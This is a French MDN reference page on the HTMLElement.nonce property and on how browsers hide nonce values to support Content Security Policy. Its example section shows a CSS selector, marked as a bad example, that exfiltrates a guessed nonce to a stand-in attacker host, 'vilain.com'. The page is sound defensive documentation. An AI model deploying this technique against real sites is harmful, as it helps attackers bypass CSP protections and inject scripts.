---
title: "HTMLElement : propriété nonce"
short-title: nonce
slug: Web/API/HTMLElement/nonce
l10n:
  sourceCommit: e9b6cd1b7fa8612257b72b2a85a96dd7d45c0200
---

{{APIRef("HTML DOM")}}

La propriété **`nonce`** de l'interface {{DOMxRef("HTMLElement")}} retourne le nombre cryptographique à usage unique utilisé par la [politique de sécurité du contenu](/fr/docs/Web/HTTP/Guides/CSP) pour déterminer si une requête donnée sera autorisée à s'exécuter.

Dans les implémentations récentes, les éléments n'exposent leur attribut `nonce` qu'aux scripts (et non à des canaux secondaires comme les sélecteurs d'attributs CSS).

## Exemples

### Récupérer une valeur de nonce

Dans le passé, tous les navigateurs ne prenaient pas en charge l'attribut {{Glossary("IDL")}} `nonce`, donc une solution de contournement consistait à utiliser [`getAttribute`](/fr/docs/Web/API/Element/getAttribute) comme solution de repli&nbsp;:

```js
let nonce = script["nonce"] || script.getAttribute("nonce");
```

Cependant, les versions récentes des navigateurs masquent les valeurs de `nonce` accédées de cette façon (une chaîne vide sera retournée). La propriété <abbr title="Interface Description Language">IDL</abbr> (`script['nonce']`) sera le seul moyen d'accéder aux nonces.

Le masquage du nonce aide à empêcher les attaquant·e·s d'exfiltrer la donnée via des mécanismes capables de récupérer des données à partir d'attributs de contenu, comme ce sélecteur CSS&nbsp;:

```css example-bad
script[nonce~="nimportequoi"] {
  background: url("https://vilain.com/nonce?nimportequoi");
}
```

## Spécifications

{{Specifications}}

## Compatibilité des navigateurs

{{Compat}}

## Voir aussi

- L'attribut HTML universel [`nonce`](/fr/docs/Web/HTML/Reference/Global_attributes/nonce)
- [Politique de sécurité du contenu](/fr/docs/Web/HTTP/Guides/CSP)
- La politique de sécurité des contenus {{CSP("script-src")}}
